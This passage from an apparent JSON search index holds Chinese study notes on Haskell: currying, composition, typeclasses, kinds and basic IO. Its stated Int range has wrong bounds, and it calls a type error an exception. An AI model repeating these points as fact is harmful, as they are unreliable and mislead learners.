\u4e2d\u7684\u51fd\u6570\u662f\u67ef\u91cc\u5316\uff08Currying\uff09\u7684\uff0c\u53ef\u4ee5\u770b\u4f5c\u6240\u6709\u51fd\u6570\u90fd\u53ea\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u6700\u7ec8\u7684\u7ed3\u679c\u3002\u6bd4\u5982 max \u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max :: Ord a => a -> a -> a \u53ef\u4ee5\u770b\u6210 a -> (a -> a)\uff0c\u5373\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> a \u7684\u51fd\u6570\u3002\u6bd4\u5982 max 1 \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max 1 :: (Ord a, Num a) => a -> a \u56e0\u6b64 max 1 2\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e (max 1) 2\uff0c\u5373\u5c06\u51fd\u6570 max 1 \u5e94\u7528\u5728\u6570\u5b572\u4e0a \u540c\u65f6\uff0c\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u53c2\u6570\u6709\u51fd\u6570\u7684\u51fd\u6570\u5c31\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570\uff08Higher Order Functions\uff09","title":"Currying"},{"location":"cs/pl/haskell/#_3","text":"","title":"\u4e00\u4e9b\u9ad8\u9636\u51fd\u6570"},{"location":"cs/pl/haskell/#function-application","text":"\u51fd\u6570\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528 $ \uff0c $ \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a ($) :: (a -> b) -> a -> b \u5b83\u53ef\u4ee5\u6539\u53d8\u51fd\u6570\u7ed3\u5408\u4f18\u5148\u7ea7\uff0c\u5c06\u5de6\u4fa7\u51fd\u6570\u5e94\u7528\u4e8e\u5168\u90e8\u53f3\u4fa7\u5185\u5bb9\u4e0a\uff0c\u76f8\u5f53\u4e8e\u7ed9\u53f3\u4fa7\u6574\u4f53\u52a0\u4e0a\u4e86\u62ec\u53f7\u3002\u5426\u5219\u51fd\u6570\u9ed8\u8ba4\u5de6\u7ed3\u5408\uff0c\u4f1a\u4f9d\u6b21\u5411\u53f3\u5e94\u7528\u800c\u4e0d\u4f1a\u5e94\u7528\u5728\u6574\u4f53\u4e0a\u3002 f $ g x -- \u7b49\u4ef7\u4e8e f ( g x ) ----- f g x -- \u7b49\u4ef7\u4e8e ( f g ) x","title":"Function application"},{"location":"cs/pl/haskell/#function-composition","text":"\u51fd\u6570\u590d\u5408\u53ef\u4ee5\u4f7f\u7528 . \uff0c . \u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a (.) :: (b -> c) -> (a -> b) -> a -> c \u5b9a\u4e49\u662f\uff1a f . g = \\x -> f (g x) \u4f46\u662f\u51fd\u6570\u590d\u5408\u7684\u4f18\u5148\u7ea7\u8981\u6bd4\u51fd\u6570\u6267\u884c\u4f4e\uff0c\u6bd4\u5982\uff1a sum . replicate 5 . max 6.7 8.9 \u4f1a\u5148\u6267\u884c max 6.7 8.9 \u5e76\u8fd4\u56de 8.9\uff0c\u7136\u540e\u5c06 sum\u3001replicate 5\u30018.9 \u590d\u5408\uff0c\u4f46\u4e24\u4e2a\u51fd\u6570\u65e0\u6cd5\u548c\u4e00\u4e2a\u503c (8.9) \u590d\u5408\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u56e0\u6b64\u8981\u4f7f\u7528 $ \u6765\u89c4\u5b9a\u5148\u590d\u5408\u518d\u6267\u884c\uff1a sum . replicate 5 . max 6.7 $ 8.9","title":"Function Composition"},{"location":"cs/pl/haskell/#lambda","text":"Haskell \u8bed\u8a00\u4e2d\u7684 lambda \u8868\u8fbe\u5f0f\u662f\u7528 \\ \u6765\u8868\u793a\u7684\uff08\u56e0\u4e3a\u770b\u7740\u50cf \\(\\mathtt{\\lambda}\\) \uff1f\uff09 \u5177\u4f53\u8bed\u6cd5\u662f \\ para1 para2 ... -> return \"->\" \u524d\u7684 para1 para2 ... \u662f\u4f20\u5165\u53c2\u6570\uff0c\u5355\u4e2a\u591a\u4e2a\u90fd\u53ef\u4ee5\uff0c\u9700\u8981\u7528\u7a7a\u683c\u9694\u5f00\uff1b\"->\" \u540e\u7684 return \u662f\u8ba1\u7b97\u5f97\u5230\u7684\u8fd4\u56de\u503c\u3002\u4e00\u822c\u9700\u8981\u7528\u62ec\u53f7\u5c06\u6574\u4e2a\u8868\u8fbe\u5f0f\u62ec\u8d77\u6765\uff0c\u9632\u6b62\u8fd4\u56de\u503c\u90e8\u5206\u4e00\u76f4\u5411\u53f3\u5ef6\u4f38\u3002","title":"lambda"},{"location":"cs/pl/haskell/#foldscan","text":"fold \u548c scan \u90fd\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u4e00\u4e2a\u521d\u59cb\u503c accumulator\uff0c\u4e00\u4e2a\u8981\u6298\u53e0\u7684\u5217\u8868\uff09\uff0cfold \u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u800c scan \u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u4f20\u5165\u7684\u4e8c\u5143\u51fd\u6570 f :: a -> b -> b \u5c06 accumulator \u548c\u4ece\u5217\u8868\u4e2d\u53d6\u51fa\u7684\u503c\u4e00\u540c\u4f20\u5165\uff08l \u5219 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0cr \u5219 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff09","title":"fold\u548cscan"},{"location":"cs/pl/haskell/#modules","text":"Haskell \u4f1a\u81ea\u52a8\u52a0\u8f7d Prelude \u6a21\u5757\uff08module\uff09\uff0c\u5982\u679c\u5728 GHCi \u4e2d\u518d\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 :m + ... \uff0c\u6bd4\u5982\u52a0\u8f7d Data.List \u6a21\u5757\uff1a Prelude> :m + Data.List \u800c\u5728 hs \u6587\u4ef6\u4e2d\u5f15\u5165\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 import \u8bed\u53e5\uff0c\u4e0b\u9762\u548c python \u7684\u5bf9\u6bd4\u53ef\u4ee5\u4fbf\u4e8e\u7406\u89e3\uff1a import Data.List -- from Data.List import * import Data.List ( nub , sort ) -- from Data.List import nub, sort import Data.List hiding ( nub ) -- \u4eceData.List\u4e2d\u5f15\u5165\u6240\u6709\uff0c\u4f46\u4e0d\u5f15\u5165nub\u51fd\u6570 import qualified Data.List -- import Data.List import qualified Data.List as Li -- import Data.List as Li","title":"Modules"},{"location":"cs/pl/haskell/#modules_1","text":"\u6a21\u5757\u4e2d\u8981\u5305\u542b\u5c06\u8981\u4f7f\u7528\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u50cf\u6b63\u5e38\u7684 hs \u6587\u4ef6\u4e00\u6837\u5199\u5373\u53ef\uff0c\u4f46\u5934\u90e8\u9700\u8981\u6709\u5bfc\u51fa\u8bed\u53e5\uff08export\uff09\u3002\u6bd4\u5982\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\u540d\u53eb ModuleA.hs \uff0c\u90a3\u5b83\u7684\u5934\u90e8\u9700\u8981\u5199\uff1a module ModuleA ( functionA , functionB , functionC ) where \u800c\u4e14\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u51fd\u6570\u53ea\u5bfc\u51fa\u9700\u8981\u4f7f\u7528\u7684\u5373\u53ef\u3002\u6bd4\u5982\u8be5\u6587\u4ef6\u4e2d\u8fd8\u542b\u6709 functionD \u4f9b\u524d\u4e09\u4e2a\u51fd\u6570\u5185\u90e8\u4f7f\u7528\uff0c\u90a3\u4e48\u5728 import ModuleA \u4e4b\u540e\u4e5f\u65e0\u6cd5\u8c03\u7528 functionD\u3002","title":"\u7f16\u5199 Modules"},{"location":"cs/pl/haskell/#types-typeclasses","text":"","title":"Types &amp; Typeclasses"},{"location":"cs/pl/haskell/#types","text":"Haskell \u6709\u4e00\u4e2a\u9759\u6001\u7c7b\u578b\u7cfb\u7edf\uff0c\u4efb\u4f55\u53d8\u91cf\u3001\u51fd\u6570\u90fd\u4f1a\u5177\u6709\u7c7b\u578b\uff0c\u5e76\u4e14\u6709\u7c7b\u578b\u5224\u65ad\u529f\u80fd\uff0c\u6ca1\u7ed9\u51fa\u7684\u7c7b\u578b\u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 Type \u7684\u9996\u5b57\u6bcd\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u7528\u7684\u6709\uff1a Int \uff1a\u6574\u578b\uff0c\u6709\u4e0a\u4e0b\u754c\u8303\u56f4\uff0c-2147483647\uff5e2147483648 Integer \uff1a\u6574\u6570\uff0c\u65e0\u754c\uff0c\u4f46\u662f\u6548\u7387\u6bd4Int\u4f4e Float \uff1a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b Double \uff1a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b Bool \uff1a\u5e03\u5c14\u503c Char \uff1a\u5b57\u7b26 String \uff1a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e [Char] Ordering \uff1a\u5927\u5c0f\u5173\u7cfb\uff0c\u5305\u542bLT\u3001EQ\u3001GT\uff0c\u4e14\u5b83\u4eec\u6709\u5927\u5c0f\u5173\u7cfb LT < EQ < GT \u5217\u8868\u7684\u7c7b\u578b\u662f\u7531\u5176\u4e2d\u5143\u7d20\u51b3\u5b9a\u7684\uff0c\u5e76\u4e14\u5217\u8868\u4e2d\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u6240\u4ee5\u5217\u8868\u7684\u7c7b\u578b\u5c31\u662f\u5176\u5143\u7d20\u7c7b\u578b\u5916\u52a0 [] \u3002 \u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u5404\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\uff0c\u56e0\u4e3a\u5143\u7ec4\u4e2d\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u4e0d\u540c\u7c7b\u578b\u3002\u5982 (\"abc\", 'a', True) \u7684\u7c7b\u578b\u662f ([Char], Char, Bool)\u3002","title":"Types"},{"location":"cs/pl/haskell/#typeclasses","text":"\u7c7b\u578b\u7c7b\uff08Typeclass\uff09\u662f\u5b9a\u4e49\u4e00\u7cfb\u5217\u529f\u80fd\u7684\u63a5\u53e3\uff0c\u5982\u679c\u4e00\u4e2a Type \u5c5e\u4e8e\u4e00\u4e2a Typeclass \u7684\u6210\u5458\uff0c\u90a3\u4e48\u5b83\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u6240\u89c4\u5b9a\u7684\u529f\u80fd\u3002\u4e00\u4e2a Type \u4e5f\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2aTypeclass Typeclass\u7684\u9996\u5b57\u6bcd\u4e5f\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u89c1\u7684\u6709\uff1a Eq \uff1a\u53ef\u5224\u65ad\u662f\u5426\u76f8\u7b49 Ord \uff1a\u53ef\u6bd4\u8f83\u5927\u5c0f Show \uff1a\u53ef\u5c55\u793a\u6210\u5b57\u7b26\u4e32 Read \uff1a\u53ef\u4ece\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u7279\u5b9a\u7c7b\u578b Enum \uff1a\u53ef\u679a\u4e3e\uff08\u8fde\u7eed\uff09\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 pred \u548c succ \u51fd\u6570\u5f97\u5230\u524d\u9a71\u548c\u540e\u7f00 Bounded : \u6709\u4e0a\u4e0b\u754c\uff0c\u5982\u679c\u5143\u7ec4\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u5c5e\u4e8e Bounded\uff0c\u90a3\u8fd9\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u4e5f\u5c5e\u4e8e Bounded Integral \uff1a\u662f\u6574\u6570\uff0c\u5305\u62ec Int \u548c Integer RealFloat \uff1a \u662f\u5b9e\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float \u548c Double RealFrac \uff1a\u662f\u5b9e\u5206\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Ratio\uff08\u5728 Data.Ratio \u6a21\u5757\u4e2d\uff09 Floating \uff1a\u662f\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Complex\uff08\u5728 Data.Complex \u6a21\u5757\u4e2d\uff09 Real \uff1a\u662f\u5b9e\u6570\uff0c\u5305\u62ec Integral \u548c RealFrac \u7684\u6210\u5458 Fractional \uff1a\u662f\u5206\u6570\uff0c\u5305\u62ec RealFrac \u548c Floating \u7684\u6210\u5458 Num \uff1a\u662f\u6570\u5b57\uff0c\u5305\u62ec\u4e0a\u8ff0\u6240\u6709\u6570\u5b57\u76f8\u5173\u7684\u7c7b\u578b","title":"Typeclasses"},{"location":"cs/pl/haskell/#type-variables","text":"\u5982\u679c\u67e5\u770b\u4e00\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 head \uff0c\u90a3\u4e48\u5c06\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u7c7b\u578b\uff1a head :: [a] -> a \u5176\u4e2d\u7684 a \u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff08type variable\uff09\uff0c\u5b83\u5728 head \u4e2d\u53ef\u4ee5\u5c5e\u4e8e\u4efb\u4f55\u7c7b\u578b\uff0c\u5728\u8fd9\u91cc\u53ea\u662f\u8868\u793a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u548c\u8f93\u5165\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u7684\u7c7b\u578b\u76f8\u4e00\u81f4\u3002 \u5728\u51fd\u6570\u7684\u7c7b\u578b\u8868\u8fbe\u5f0f\u5176\u5b9e\u53ef\u4ee5\u770b\u4f5c \\(\\lambda\\) \u8868\u8fbe\u5f0f\uff0c\u5b83\u9002\u7528\u4e8e \\(\\alpha\\) \u53d8\u6362\uff08 \\(\\alpha\\) -conversion\uff09\u3002\u5373 a \u5728\u8fd9\u91cc\u53ef\u4ee5\u6307 Int\u3001Char \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u6307 [Char], (Int, Char), \u751a\u81f3\u51fd\u6570 Int -> Int \u7b49\u3002 \u5728\u5927\u90e8\u5206\u51fd\u6570\u7684\u7c7b\u578b\u4e2d\uff0c\u7c7b\u578b\u53d8\u91cf\u9700\u8981\u4fdd\u8bc1\u662f\u67d0\u4e2a Typeclass \u7684\u6210\u5458\u624d\u80fd\u5b8c\u6210\u64cd\u4f5c\u3002\u6bd4\u5982 (==) \u51fd\u6570\uff0c\u5b83\u9700\u8981\u4f20\u5165\u7684\u53c2\u6570\u662f\u53ef\u5224\u65ad\u76f8\u7b49\u7684\uff0c\u5373\u662f Eq \u7684\u6210\u5458\uff0c\u90a3\u4e48 (==) \u7684\u7c7b\u578b\u5c31\u662f\uff1a (==) :: (Eq a) => a -> a -> Bool \u5176\u4e2d => \u524d\u7684\u90e8\u5206 (Eq a) \u5c31\u662f\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u5b83\u89c4\u5b9a\u4e86 a \u662f Eq \u7684\u6210\u5458\uff0c\u6240\u4ee5 (==) \u51fd\u6570\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u662f a \u7c7b\u578b\uff0c\u4e14\u90fd\u662f Eq \u7684\u6210\u5458\uff0c\u4fdd\u8bc1\u4e86\u5b83\u4eec\u4e4b\u95f4\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\u3002","title":"Type variables"},{"location":"cs/pl/haskell/#type","text":"\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Type \u9700\u8981\u4f7f\u7528 data \u5173\u952e\u5b57\uff0c\u6bd4\u5982\u5b9a\u4e49 Bool \u9700\u8981\u4f7f\u7528\uff1a data Bool = False | True \u5176\u4e2d = \u5de6\u4fa7\u7684\u90e8\u5206\u5b9a\u4e49\u4e86\u65b0\u7c7b\u578b\u7684\u540d\u79f0 Bool \uff0c\u53f3\u4fa7\u7684\u90e8\u5206\u53eb\u505a\u503c\u6784\u9020\u5668\uff08value constructors\uff09\uff0c\u8868\u793a\u4e86 Bool \u7c7b\u578b\u7684\u503c\u4e3a False \u6216 True\u3002 \u5e76\u4e14\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u7684\u9996\u5b57\u6bcd\u90fd\u9700\u8981\u5927\u5199\u3002 \u53e6\u5916\uff0c\u503c\u6784\u9020\u5668\u4e5f\u662f\u51fd\u6570\uff0c\u5b83\u4eec\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u53eb\u505a\u9879\uff08field\uff09\u3002\u6bd4\u5982\uff1a data Shape = Circle Float Float Float | Rectangle Float Float Float Float \u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0 Type \u53eb Shape\uff0c\u503c\u6784\u9020\u5668\u662f Circle \u548c Rectangle\uff0cCircle \u63a5\u6536\u4e09\u4e2a\u53c2\u6570\u90fd\u662f Float \u7c7b\u578b\uff0cRectangle \u63a5\u6536\u56db\u4e2a Float \u7c7b\u578b\u53c2\u6570\u3002 \u5982\u679c\u67e5\u770b Circle \u7684\u7c7b\u578b\uff0c\u5c06\u8fd4\u56de\uff1a Circle :: Float -> Float -> Float -> Shape \u5982\u679c\u60f3\u8981\u8ba9\u5b83\u80fd\u7ed9\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u9700\u8981\u8ba9\u5b83\u5c5e\u4e8e Show \u7c7b\u578b\u7c7b\u3002\u5728\u4ee3\u7801\u4e2d\u53ea\u9700\u8981\u5728\u7ed3\u5c3e\u52a0\u4e0a deriving (Show) : data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving ( Show ) \u7c7b\u578b\u7684\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u540d\u79f0\u4e5f\u53ef\u4ee5\u76f8\u540c\uff0c\u6bd4\u5982\uff1a data Point = Point Float Float deriving ( Show )","title":"\u5b9a\u4e49\u65b0 Type"},{"location":"cs/pl/haskell/#typeclass","text":"\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Typeclass \u9700\u8981\u4f7f\u7528 class \u5173\u952e\u5b57\uff0c\u4f8b\u5982\u5b9a\u4e49 Eq \u7c7b\u578b\u7c7b\uff1a class Eq a where ( == ) :: a -> a -> Bool ( /= ) :: a -> a -> Bool x == y = not ( x /= y ) x /= y = not ( x == y ) \u5176\u4e2d a \u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff0c\u524d\u4e24\u884c\u58f0\u660e\u4e86\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u7684\u540d\u5b57\u53ca\u5176\u7c7b\u578b\uff0c\u540e\u4e24\u884c\u8868\u660e\u4e86\u9700\u8981\u7684\u51fd\u6570\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u5b9a\u4e49\uff08\u4e0d\u5fc5\u8981\uff09\u3002 \u5305\u542b\u4e86\u540e\u4e24\u884c\u4e4b\u540e\uff0c\u53ea\u5b9a\u4e49 (==) \u51fd\u6570\u6216\u8005 (/=) \u51fd\u6570\u90fd\u53ef\u4ee5\u5b8c\u6210\u5168\u90e8\u5b9a\u4e49\uff0c\u5b83\u4eec\uff08 (==) | (/=) \uff09\u6210\u4e3a\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u7684\u6700\u5c0f\u5b8c\u6574\u5b9a\u4e49\uff08minimal complete definition\uff09 \u67e5\u770b\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u6210\u5458\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u53ef\u4ee5\u5728 GHCi \u4e2d\u4f7f\u7528 :info \uff1a ghci> :info Eq","title":"\u5b9a\u4e49\u65b0 Typeclass"},{"location":"cs/pl/haskell/#kinds","text":"\u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u53eb\u505a\u7c7b\u578b\uff08Type\uff09\uff0c\u800c\u4e00\u4e2a\u7c7b\u578b\u7684\u7c7b\u578b\u53eb\u505a Kind\u3002\u53ef\u4ee5\u901a\u8fc7 GHCi \u4e2d :k \u6765\u67e5\u770b Kind\uff1a ghci > : k Int Int :: * ghci > : k Maybe Maybe :: * -> * ghci > : k Maybe Int Maybe Int :: * ghci > : k Either Either :: * -> * -> * \u5176\u4e2d\u7684\u661f\u53f7 * \u4ee3\u8868\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08concrete type\uff09\u3002Int \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Int \u7684 Kind \u662f *\u3002\u800c Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u6240\u4ee5 Maybe \u7684 Kind \u662f * -> *\u3002\u5982\u679c\u7ed9 Maybe \u4f20\u5165\u4e86\u4e00\u4e2a Int\uff0c\u90a3\u4e48\u5f97\u5230\u7684 Maybe Int \u5c31\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u5b83\u7684 Kind \u5c31\u662f *\u3002Either \u4e5f\u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4f46\u5b83\u63a5\u6536\u4e24\u4e2a\u7c7b\u578b\u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6240\u4ee5 Either \u7684 Kind \u662f * -> * -> *\u3002","title":"Kinds"},{"location":"cs/pl/haskell/#inputoutput","text":"","title":"Input/Output"},{"location":"cs/pl/haskell/#haskell","text":"\u4e0d\u5728 GHCi \u4e2d\u8fd0\u884c\u4e00\u4e2a Haskell \u7a0b\u5e8f\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a \u7f16\u8bd1\u8fd0\u884c\uff1a $ ghc --make code $ ./code \u901a\u8fc7 runhaskell \u547d\u4ee4\u76f4\u63a5\u8fd0\u884c\uff1a $ runhaskell code.hs","title":"\u8fd0\u884c Haskell \u7a0b\u5e8f"},{"location":"cs/pl/haskell/#_5","text":"\u5728\u4e00\u4e2a Haskell \u7a0b\u5e8f\u4e2d\u8f93\u51fa\u6587\u5b57\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a main \u51fd\u6570\uff1a main = putStrLn \"Hello World\" \u5176\u4e2d putStrLn \u7684\u7c7b\u578b\u662f\uff1a putStrLn :: String -> IO () putStrLn \u63a5\u6536\u4e00\u4e2a String \u7c7b\u578b\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u4e3a () \u7c7b\u578b\u7684 IO \u52a8\u4f5c\uff08I/O action\uff09\u3002\u6240\u4ee5 main \u51fd\u6570\u7684\u7c7b\u578b\u4e3a IO ()\u3002\uff08IO \u7684 Kind \u662f* -> *\uff09 \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u9ed8\u8ba4\u63d0\u4f9b\u7684\u8f93\u51fa\u6587\u672c\u7684\u51fd\u6570\uff1a putStr \uff1a\u8f93\u51fa\u6587\u672c\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c putChar \uff1a\u8f93\u51fa\u5355\u4e2a\u5b57\u7b26\uff0c\u7ed3\u5c3e\u4e0d\u6362\u884c\u3002\u63a5\u6536\u7684\u53c2\u6570\u4e3a\u5355\u4e2a Char\uff0c\u4e0d\u662f String\uff08\u7528\u5355\u5f15\u53f7\u4e0d\u662f\u53cc\u5f15\u53f7\uff09 print \uff1a\u53ef\u4ee5\u63a5\u6536\u4efb\u4f55 Show \u7684\u6210\u5458\uff0c\u5148\u7528 show \u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u7136\u540e\u8f93\u51fa\u3002\u7b49\u540c\u4e8e putStrLn . show","title":"\u8f93\u51fa\u6587\u672c"},{"location":"cs/pl/haskell/#_6","text":"\u8f93\u5165\u6587\u5b57\u9700\u8981\u5728 do \u5757\u4e2d\u4f7f\u7528 getLine\uff1a main = do line <- getLine putStrLn line getLine \u7684\u7c7b\u578b\u662f\uff1a getLine :: IO String \u800c <- \u64cd\u4f5c\u7b26\u5c06 getLine \u4e2d\u7684 String \u63d0\u53d6\u4e86\u51fa\u6765\u7ed9\u5230\u4e86 line\uff0c\u4f7f line \u53d8\u6210\u4e86 String \u7c7b\u578b\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32 \u800c\u4e14\u4f7f\u7528\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u8981\u7ecf\u8fc7\u4e00\u6b21 <-\uff0c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 getLine \u4f5c\u4e3a\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a getLine \u4e0d\u662f String \u7c7b\u578b\uff0c\u800c\u662f IO String \u7c7b\u578b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 getChar \u6765\u83b7\u53d6\u5355\u4e2a\u5b57\u7b26\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u4f7f\u7528 <- \u64cd\u4f5c\u7b26\u6765\u63d0\u53d6 Char","title":"\u8f93\u5165\u6587\u672c"},{"location":"cs/pl/haskell/#io","text":"","title":"\u5176\u4ed6 IO \u76f8\u5173\u51fd\u6570\u7528\u6cd5"},{"location":"cs/pl/haskell/#_7","text":"\u4ee5\u4e0b\u4e0e\u6587\u4ef6\u548c\u6d41\u76f8\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.IO \u6a21\u5757\u4e2d","title":"\u6587\u4ef6\u548c\u6d41"},{"location":"cs/pl/haskell/#_8","text":"\u76f8\u5173\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Directory \u6a21\u5757\u4e2d\uff0c\u5168\u90e8\u5185\u5bb9\u89c1 System.Directory","title":"\u8def\u5f84\u64cd\u4f5c"},{"location":"cs/pl/haskell/#command-line-arguments","text":"System.Environment \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5904\u7406\u4f20\u5165\u547d\u4ee4\u884c\u7684\u53c2\u6570","title":"Command line arguments"},{"location":"cs/pl/haskell/#randomness","text":"\u548c\u968f\u673a\u6570\u6709\u5173\u7684\u51fd\u6570\u90fd\u5305\u542b\u5728 System.Random \u6a21\u5757\u4e2d\u3002GHCi \u542f\u52a8\u65f6\u53ef\u80fd\u4e0d\u4f1a\u5305\u542b System.Random \u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u65e0\u6cd5\u627e\u5230\u6a21\u5757\u3002\u9700\u8981\u901a\u8fc7 stack \u6253\u5f00: stack ghci --package random Haskell \u8981\u6c42\u540c\u6837\u7684\u7a0b\u5e8f\u9700\u8981\u8fd0\u884c\u51fa\u540c\u6837\u7684\u7ed3\u679c\uff0c\u9664\u4e86\u7528\u5230\u4e86 I/O action\uff0c\u6240\u6709\u4f1a\u9020\u6210\u4e0d\u540c\u7ed3\u679c\u7684\u51fd\u6570\u90fd\u8981\u4ea4\u7ed9 I/O action \u6765\u5b8c\u6210 \u90a3\u8981\u4f7f\u968f\u673a\u6570\u8131\u79bb IO \u5b58\u5728\uff0c\u5c31\u8981\u7528\u5230\u968f\u673a\u751f\u6210\u5668\uff08random generator\uff09 System.Random \u6a21\u5757\u63d0\u4f9b\u4e86\u51e0\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\uff1a","title":"Randomness"},{"location":"cs/pl/haskell/#exceptions","text":"\u7a0b\u5e8f\u5728\u8fd0\u884c\u5931\u8d25\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u53ef\u4ee5\u901a\u8fc7 Control.Exception \u6a21\u5757\u4e2d\u7684 catch \u51fd\u6570\u6765\u6355\u83b7\u5f02\u5e38\uff1a catch :: Exception e => IO a -> (e -> IO a) -> IO a \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u4ee5 IO a 